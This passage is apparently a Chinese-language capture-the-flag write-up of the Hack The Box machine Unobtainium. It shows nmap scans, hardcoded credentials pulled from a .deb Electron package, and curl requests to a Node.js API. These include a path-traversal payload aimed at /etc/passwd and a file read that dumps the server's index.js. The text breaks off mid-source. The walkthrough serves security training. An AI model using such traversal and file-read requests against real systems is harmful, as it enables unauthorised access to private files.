            <a class="category-link" href="/categories/htb-Season-5/">
                htb-Season-5
                <div class="category-count">7</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-6/">
                htb-Season-6
                <div class="category-count">10</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-4/">
                htb-Season-4
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-7/">
                htb-Season-7
                <div class="category-count">9</div>
            </a>
        
            <a class="category-link" href="/categories/CVE/">
                CVE
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/categories/ctf/">
                ctf
                <div class="category-count">8</div>
            </a>
        
            <a class="category-link" href="/categories/Sherlocks/">
                Sherlocks
                <div class="category-count">1</div>
            </a>
        </div>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Recent Posts</h3>
      <ul>
        
          <a class="recent-link" href="/2025/04/21/ActionOPs/" title="ActionOPs" >
            <div class="recent-link-text">
              ActionOPs
            </div>
          </a>
        
          <a class="recent-link" href="/2025/04/14/Kubernetes-IngressNightmare-1/" title="「IngressNightmareをめざす異世界泥頭車！一、serviceはなに？！」" >
            <div class="recent-link-text">
              「IngressNightmareをめざす異世界泥頭車！一、serviceはなに？！」
            </div>
          </a>
        
          <a class="recent-link" href="/2025/04/13/box-wp-Nocturnal/" title="【season-7】 htb Nocturnal wp" >
            <div class="recent-link-text">
              【season-7】 htb Nocturnal wp
            </div>
          </a>
        
          <a class="recent-link" href="/2025/04/04/box-wp-Haze/" title="【season-7】 htb Haze wp" >
            <div class="recent-link-text">
              【season-7】 htb Haze wp
            </div>
          </a>
        
          <a class="recent-link" href="/2025/03/25/box-wp-Code/" title="【season-7】 htb Code wp" >
            <div class="recent-link-text">
              【season-7】 htb Code wp
            </div>
          </a>
        
      </ul>
    </div>
  </div>

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       


<article id="post-Tracks-cloud-Unobtianium" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
<div class="article-gallery">
  <div class="article-gallery-photos">
    
      <a class="article-gallery-img" rel="gallery_cm95uvrc0001c3gky0mhp536m">
        <img src="/wpimages/2024/tracks-cloud/Unobtianium/background.jpg" itemprop="image">
      </a>
    
  </div>
</div>

   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        Tracks-cloud-Unobtianium
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2024-12-08T09:10:21.000Z" itemprop="datePublished">2024-12-08</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/cloud/">cloud</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            45k words 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/deb/" rel="tag">deb</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/k8s/" rel="tag">k8s</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/merge/" rel="tag">merge</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/nodejs/" rel="tag">nodejs</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pods/" rel="tag">pods</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sercerts/" rel="tag">sercerts</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">└─$ sudo nmap -sS 10.10.10.235 -p80,8443,10250,10251,31337 --min-rate=2000</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-04 03:02 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> unobtainium.htb (10.10.10.235)</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">80/tcp    open  http</span><br><span class="line">8443/tcp  open  https-alt</span><br><span class="line">10250/tcp open  unknown</span><br><span class="line">10251/tcp open  unknown</span><br><span class="line">31337/tcp open  Elite</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.74 seconds</span><br><span class="line"></span><br><span class="line">┌──(fonllge㉿harusaruhi)-[~/Downloads]</span><br><span class="line">└─$ sudo nmap -sS 10.10.10.235 -p80,8443,10250,10251,31337 --min-rate=2000 -sV -sC</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-04 03:02 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> unobtainium.htb (10.10.10.235)</span><br><span class="line">Host is up (0.26s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">80/tcp    open  http          Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Unobtainium</span><br><span class="line">8443/tcp  open  ssl/https-alt</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (application/json).</span></span><br><span class="line"><span class="string">| ssl-cert: Subject: commonName=k3s/organizationName=k3s</span></span><br><span class="line"><span class="string">| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster.local, DNS:localhost, DNS:unobtainium, DNS:unobtainium.htb, IP Address:10.10.10.235, IP Address:10.129.136.226, IP Address:10.43.0.1, IP Address:127.0.0.1</span></span><br><span class="line"><span class="string">| Not valid before: 2022-08-29T09:26:11</span></span><br><span class="line"><span class="string">|_Not valid after:  2025-12-04T07:21:49</span></span><br><span class="line"><span class="string">| http-auth:</span></span><br><span class="line"><span class="string">| HTTP/1.1 401 Unauthorized\x0D</span></span><br><span class="line"><span class="string">|_  Server returned status 401 but no WWW-Authenticate header.</span></span><br><span class="line"><span class="string">| fingerprint-strings:</span></span><br><span class="line"><span class="string">|   FourOhFourRequest:</span></span><br><span class="line"><span class="string">|     HTTP/1.0 401 Unauthorized</span></span><br><span class="line"><span class="string">|     Audit-Id: 93e7114d-e02a-4331-9d64-76c6596a6740</span></span><br><span class="line"><span class="string">|     Cache-Control: no-cache, private</span></span><br><span class="line"><span class="string">|     Content-Type: application/json</span></span><br><span class="line"><span class="string">|     Date: Wed, 04 Dec 2024 08:03:05 GMT</span></span><br><span class="line"><span class="string">|     Content-Length: 129</span></span><br><span class="line"><span class="string">|     &#123;&quot;kind&quot;:&quot;Status&quot;,&quot;apiVersion&quot;:&quot;v1&quot;,&quot;metadata&quot;:&#123;&#125;,&quot;status&quot;:&quot;Failure&quot;,&quot;message&quot;:&quot;Unauthorized&quot;,&quot;reason&quot;:&quot;Unauthorized&quot;,&quot;code&quot;:401&#125;</span></span><br><span class="line"><span class="string">|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie:</span></span><br><span class="line"><span class="string">|     HTTP/1.1 400 Bad Request</span></span><br><span class="line"><span class="string">|     Content-Type: text/plain; charset=utf-8</span></span><br><span class="line"><span class="string">|     Connection: close</span></span><br><span class="line"><span class="string">|     Request</span></span><br><span class="line"><span class="string">|   GetRequest:</span></span><br><span class="line"><span class="string">|     HTTP/1.0 401 Unauthorized</span></span><br><span class="line"><span class="string">|     Audit-Id: 159c3774-fa52-4e83-8f56-1cfb51471b87</span></span><br><span class="line"><span class="string">|     Cache-Control: no-cache, private</span></span><br><span class="line"><span class="string">|     Content-Type: application/json</span></span><br><span class="line"><span class="string">|     Date: Wed, 04 Dec 2024 08:03:02 GMT</span></span><br><span class="line"><span class="string">|     Content-Length: 129</span></span><br><span class="line"><span class="string">|     &#123;&quot;kind&quot;:&quot;Status&quot;,&quot;apiVersion&quot;:&quot;v1&quot;,&quot;metadata&quot;:&#123;&#125;,&quot;status&quot;:&quot;Failure&quot;,&quot;message&quot;:&quot;Unauthorized&quot;,&quot;reason&quot;:&quot;Unauthorized&quot;,&quot;code&quot;:401&#125;</span></span><br><span class="line"><span class="string">|   HTTPOptions:</span></span><br><span class="line"><span class="string">|     HTTP/1.0 401 Unauthorized</span></span><br><span class="line"><span class="string">|     Audit-Id: 3ca068c4-7101-4d7c-8b4b-1f142e4ec1da</span></span><br><span class="line"><span class="string">|     Cache-Control: no-cache, private</span></span><br><span class="line"><span class="string">|     Content-Type: application/json</span></span><br><span class="line"><span class="string">|     Date: Wed, 04 Dec 2024 08:03:04 GMT</span></span><br><span class="line"><span class="string">|     Content-Length: 129</span></span><br><span class="line"><span class="string">|_    &#123;&quot;kind&quot;:&quot;Status&quot;,&quot;apiVersion&quot;:&quot;v1&quot;,&quot;metadata&quot;:&#123;&#125;,&quot;status&quot;:&quot;Failure&quot;,&quot;message&quot;:&quot;Unauthorized&quot;,&quot;reason&quot;:&quot;Unauthorized&quot;,&quot;code&quot;:401&#125;</span></span><br><span class="line"><span class="string">10250/tcp open  ssl/http      Golang net/http server (Go-IPFS json-rpc or InfluxDB API)</span></span><br><span class="line"><span class="string">|_http-title: Site doesn&#x27;</span>t have a title (text/plain; charset=utf-8).</span><br><span class="line">| ssl-cert: Subject: commonName=unobtainium</span><br><span class="line">| Subject Alternative Name: DNS:unobtainium, DNS:localhost, IP Address:127.0.0.1, IP Address:10.10.10.235</span><br><span class="line">| Not valid before: 2022-08-29T09:26:11</span><br><span class="line">|_Not valid after:  2025-12-04T07:21:51</span><br><span class="line">10251/tcp open  unknown</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   FourOhFourRequest:</span><br><span class="line">|     HTTP/1.0 404 Not Found</span><br><span class="line">|     Cache-Control: no-cache, private</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     X-Content-Type-Options: nosniff</span><br><span class="line">|     Date: Wed, 04 Dec 2024 08:03:29 GMT</span><br><span class="line">|     Content-Length: 19</span><br><span class="line">|     page not found</span><br><span class="line">|   GenericLines, Help, Kerberos, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:</span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   GetRequest:</span><br><span class="line">|     HTTP/1.0 404 Not Found</span><br><span class="line">|     Cache-Control: no-cache, private</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     X-Content-Type-Options: nosniff</span><br><span class="line">|     Date: Wed, 04 Dec 2024 08:02:56 GMT</span><br><span class="line">|     Content-Length: 19</span><br><span class="line">|     page not found</span><br><span class="line">|   HTTPOptions:</span><br><span class="line">|     HTTP/1.0 404 Not Found</span><br><span class="line">|     Cache-Control: no-cache, private</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     X-Content-Type-Options: nosniff</span><br><span class="line">|     Date: Wed, 04 Dec 2024 08:02:57 GMT</span><br><span class="line">|     Content-Length: 19</span><br><span class="line">|_    page not found</span><br><span class="line">31337/tcp open  http          Node.js Express framework</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: PUT DELETE</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (application/json; charset=utf-8).</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p>k8s端口全有鉴权</p>
<p>80给了三个包，我拿的deb</p>
<p>down下来后拆一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">└─$ pwd                                                                               </span><br><span class="line">/Downloads/opt/unobtainium/resources</span><br><span class="line">                                                                                                                               </span><br><span class="line"></span><br><span class="line">└─$ ls      </span><br><span class="line">app.asar</span><br><span class="line"></span><br><span class="line">└─$ grep -a -E &#x27;http://[^.]+\.htb&#x27; app.asar      </span><br><span class="line">  &quot;homepage&quot;: &quot;http://unobtainium.htb&quot;,</span><br><span class="line">        url: &#x27;http://unobtainium.htb:31337/&#x27;,</span><br><span class="line">//# sourceMappingURL=bootstrap.bundle.min.js.map$.ajax(&#123;url: &quot;http://unobtainium.htb:31337&quot;,</span><br><span class="line">    url: &#x27;http://unobtainium.htb:31337&#x27;,</span><br><span class="line">    url: &#x27;http://unobtainium.htb:31337/todo&#x27;,</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>包里看到有些ajax请求</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    url: &#x27;http://unobtainium.htb:31337/todo&#x27;,</span><br><span class="line">    type: &#x27;post&#x27;,</span><br><span class="line">    dataType:&#x27;json&#x27;,</span><br><span class="line">    contentType:&#x27;application/json&#x27;,</span><br><span class="line">    processData: false,</span><br><span class="line">    data: JSON.stringify(&#123;&quot;auth&quot;: &#123;&quot;name&quot;: &quot;felamos&quot;, &quot;password&quot;: &quot;Winter2021&quot;&#125;, &quot;filename&quot; : &quot;todo.txt&quot;&#125;),</span><br><span class="line">    success: function(data) &#123;</span><br><span class="line">        $(&quot;#output&quot;).html(JSON.stringify(data));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$(document).ready(function()&#123;</span><br><span class="line"></span><br><span class="line">    $(&quot;#but_submit&quot;).click(function()&#123;  </span><br><span class="line">        var message = $(&quot;#message&quot;).val().trim();</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">        url: &#x27;http://unobtainium.htb:31337/&#x27;,</span><br><span class="line">        type: &#x27;put&#x27;,                    </span><br><span class="line">        dataType:&#x27;json&#x27;,                                                        </span><br><span class="line">        contentType:&#x27;application/json&#x27;,                                         </span><br><span class="line">        processData: false,                                                     </span><br><span class="line">        data: JSON.stringify(&#123;&quot;auth&quot;: &#123;&quot;name&quot;: &quot;felamos&quot;, &quot;password&quot;: &quot;Winter2021&quot;&#125;, &quot;message&quot;: &#123;&quot;text&quot;: message&#125;&#125;),</span><br><span class="line">        success: function(data) &#123;                                               </span><br><span class="line">            //$(&quot;#output&quot;).html(JSON.stringify(data));                          </span><br><span class="line">            $(&quot;#output&quot;).html(&quot;Message has been sent!&quot;);                        </span><br><span class="line">        &#125;                                                                       </span><br><span class="line">    &#125;);                                                                         </span><br><span class="line">&#125;);  </span><br></pre></td></tr></table></figure>

<p>给了个账号密码倒是，尝试请求<code>http://unobtainium.htb:31337/todo</code>，因为他读了个文件，可能会有<code>lfi</code></p>
<p>这里抓他应用的包直接发一个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">└─$ curl -XPOST &#x27;http://10.10.10.235:31337/todo&#x27; -H &#x27;Content-Type: application/json&#x27; -d &#x27;&#123;&quot;auth&quot;: &#123;&quot;name&quot;: &quot;felamos&quot;, &quot;password&quot;: &quot;Winter2021&quot;&#125;, &quot;filename&quot; :&quot;todo.txt&quot;&#125;&#x27; -svk</span><br><span class="line">*   Trying 10.10.10.235:31337...</span><br><span class="line">* Connected to 10.10.10.235 (10.10.10.235) port 31337</span><br><span class="line">&gt; POST /todo HTTP/1.1</span><br><span class="line">&gt; Host: 10.10.10.235:31337</span><br><span class="line">&gt; User-Agent: curl/8.8.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; Content-Type: application/json</span><br><span class="line">&gt; Content-Length: 79</span><br><span class="line">&gt; </span><br><span class="line">* upload completely sent off: 79 bytes</span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; X-Powered-By: Express</span><br><span class="line">&lt; Content-Type: application/json; charset=utf-8</span><br><span class="line">&lt; Content-Length: 293</span><br><span class="line">&lt; ETag: W/&quot;125-tNs2+nU0UiQGmLreBy4Pj891aVA&quot;</span><br><span class="line">&lt; Date: Wed, 04 Dec 2024 08:35:12 GMT</span><br><span class="line">&lt; Connection: keep-alive</span><br><span class="line">&lt; Keep-Alive: timeout=5</span><br><span class="line">&lt; </span><br><span class="line">* Connection #0 to host 10.10.10.235 left intact</span><br><span class="line">&#123;&quot;ok&quot;:true,&quot;content&quot;:&quot;1. Create administrator zone.\n2. Update node JS API Server.\n3. Add Login functionality.\n4. Complete Get Messages feature.\n5. Complete ToDo feature.\n6. Implement Google Cloud Storage function: https://cloud.google.com/storage/docs/json_api/v1\n7. Improve security\n&quot;&#125; </span><br></pre></td></tr></table></figure>

<p>获取到了<code>todo.txt</code></p>
<p>接下来尝试读别的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">─$ curl -XPOST <span class="string">&#x27;http://10.10.10.235:31337/todo&#x27;</span> -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> -d <span class="string">&#x27;&#123;&quot;auth&quot;: &#123;&quot;name&quot;: &quot;felamos&quot;, &quot;password&quot;: &quot;Winter2021&quot;&#125;, &quot;filename&quot; :&quot;../../../../../../etc/passwd&quot;&#125;&#x27;</span> -sk  </span><br><span class="line">-sv</span><br><span class="line">*   Trying 10.10.10.235:31337...</span><br><span class="line">* Connected to 10.10.10.235 (10.10.10.235) port 31337</span><br><span class="line">&gt; POST /todo HTTP/1.1</span><br><span class="line">&gt; Host: 10.10.10.235:31337</span><br><span class="line">&gt; User-Agent: curl/8.8.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; Content-Type: application/json</span><br><span class="line">&gt; Content-Length: 99</span><br><span class="line">&gt; </span><br><span class="line">* upload completely sent off: 99 bytes</span><br></pre></td></tr></table></figure>

<p>他就卡住了</p>
<p>将他filename置空试下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">└─$ curl -XPOST <span class="string">&#x27;http://10.10.10.235:31337/todo&#x27;</span> -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> -d <span class="string">&#x27;&#123;&quot;auth&quot;: &#123;&quot;name&quot;: &quot;felamos&quot;, &quot;password&quot;: &quot;Winter2021&quot;&#125;, &quot;filename&quot; :&quot;&quot;&#125;&#x27;</span> -sk                  </span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Error&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;pre&gt;Error: ENOENT: no such file or directory, open&lt;br&gt; &amp;nbsp; &amp;nbsp;at Object.openSync (fs.js:498:3)&lt;br&gt; &amp;nbsp; &amp;nbsp;at Object.readFileSync (fs.js:394:35)&lt;br&gt; &amp;nbsp; &amp;nbsp;at /usr/src/app/index.js:86:41&lt;br&gt; &amp;nbsp; &amp;nbsp;at Array.forEach (&amp;lt;anonymous&amp;gt;)&lt;br&gt; &amp;nbsp; &amp;nbsp;at /usr/src/app/index.js:84:36&lt;br&gt; &amp;nbsp; &amp;nbsp;at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5)&lt;br&gt; &amp;nbsp; &amp;nbsp;at next (/usr/src/app/node_modules/express/lib/router/route.js:137:13)&lt;br&gt; &amp;nbsp; &amp;nbsp;at Route.dispatch (/usr/src/app/node_modules/express/lib/router/route.js:112:3)&lt;br&gt; &amp;nbsp; &amp;nbsp;at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5)&lt;br&gt; &amp;nbsp; &amp;nbsp;at /usr/src/app/node_modules/express/lib/router/index.js:281:22&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>出现报错，筛选一下他项目报错的文件，因为是nodejs的服务，大概率突破口在这</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ curl -XPOST <span class="string">&#x27;http://10.10.10.235:31337/todo&#x27;</span> -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> -d <span class="string">&#x27;&#123;&quot;auth&quot;: &#123;&quot;name&quot;: &quot;felamos&quot;, &quot;password&quot;: &quot;Winter2021&quot;&#125;, &quot;filename&quot; :&quot;&quot;&#125;&#x27;</span> -sk|grep -E <span class="string">&#x27;[^/]+.js&#x27;</span> -o|<span class="built_in">sort</span> -u</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;Error: ENOENT: no such file or directory, open&lt;br&gt; &amp;nbsp; &amp;nbsp;at Object.openSync (fs.js:498:3)&lt;br&gt; &amp;nbsp; &amp;nbsp;at Object.readFileSync (fs.js</span><br><span class="line">index.js</span><br><span class="line">layer.js</span><br><span class="line">route.js</span><br></pre></td></tr></table></figure>

<p>再一次尝试读取，三个都试了下，只有<code>index.js</code>可以读到，不知道什么原理</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> root = <span class="built_in">require</span>(<span class="string">&quot;google-cloudstorage-commands&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> _ = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> users = [</span><br><span class="line">  &#123;<span class="attr">name</span>: <span class="string">&#x27;felamos&#x27;</span>, <span class="attr">password</span>: <span class="string">&#x27;Winter2021&#x27;</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">name</span>: <span class="string">&#x27;admin&#x27;</span>, <span class="attr">password</span>: <span class="title class_">Math</span>.<span class="title function_">random</span>().<span class="title function_">toString</span>(<span class="number">32</span>), <span class="attr">canDelete</span>: <span class="literal">true</span>, <span class="attr">canUpload</span>: <span class="literal">true</span>&#125;,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> messages = [];</span><br><span class="line"><span class="keyword">let</span> lastId = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">findUser</span>(<span class="params">auth</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> users.<span class="title function_">find</span>(<span class="function">(<span class="params">u</span>) =&gt;</span></span><br><span class="line">    u.<span 